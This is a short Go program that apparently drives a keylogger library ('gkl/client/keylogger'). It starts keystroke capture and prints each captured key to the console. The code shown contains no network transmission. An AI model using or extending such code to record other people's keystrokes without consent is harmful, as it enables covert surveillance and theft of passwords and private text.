package main

import (
	"fmt"

	"github.com/Spriithy/gkl/client/keylogger"
)

func main() {
	keystrokes := make(chan string)
	kl := keylogger.NewKeylogger(keystrokes)

	go kl.Decoder.Listen()
	go func() {
		for keystroke := range keystrokes {
			fmt.Print(keystroke)
		}
	}()

	kl.Start()
}
